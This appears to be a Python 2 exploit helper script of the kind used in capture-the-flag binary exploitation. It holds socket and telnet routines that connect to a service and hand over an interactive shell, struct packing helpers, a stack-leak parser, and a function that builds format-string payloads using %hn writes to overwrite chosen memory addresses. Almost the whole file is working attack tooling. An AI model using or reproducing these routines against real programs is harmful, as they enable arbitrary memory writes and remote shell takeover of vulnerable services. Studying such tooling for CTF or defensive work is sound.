#!/usr/bin/env python2

import binascii
import re
import socket
import struct
import subprocess
import sys
import telnetlib
import time


def read_until(f, delim='\n'):
    data = ""
    while not data.endswith(delim):
        data += f.read(1)
    return data

def connect(rhp=("localhost", 1919)):
    s = socket.create_connection(rhp)
    f = s.makefile('rw', bufsize=0)
    return s, f

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s

    print "[+] 4ll y0U n33D 15 5h3ll!!"
    t.interact()

def p(x, t="<Q"):
    return struct.pack(t, x)

def u(x, t="<Q"):
    return struct.unpack(t, x)[0]

def unsigned(x):
    return u(p(x, t="<q"), t="<Q")

def overwrite(pairs, index=7):
    (addrs, datas) = pairs
    if len(addrs) != len(datas):
        sys.stderr.write("[!] number of `pairs', elements don't be matched in overwrite()\n")
        return ""
    
    payload = ""
    for addr in addrs:
        # A, A+2, B, B+2, C, C+2, ...
        payload += p(addr) + p(addr+2)
    dataset = map(lambda x: [x&0xffff, (x>>16)&0xffff], datas)
    dataset = sum(dataset, []) # it's a cool technique ;)
    num = -len(payload)
    prev = 0
    for i, data in enumerate(dataset):
        data += num
        data = unsigned(data) if data < 0 else u(p(data, t="<H"), t="<H")
        payload += "%{}x%{}$hn%{}x".format(data, index+i, (0x10000 - data + num) % 0x10000)
        num = 0

    return payload

def stack_leak(data, write=True):
    data = data.replace('(nil)', '0x0')
    data = data.split('0x')[1:]
    stack = map(lambda x: int('0x'+x, 16), data)
    if write:
        print map(lambda x: "0x{:08x}".format(x), stack)
    return stack

def message(message_type, message_body, value=None):
    text = ""
    if value:
        text = "[{}] {}: 0x{:08x}".format(message_type, message_body, value)
    else:
        text = "[{}] {}".format(message_type, message_body)
    print text

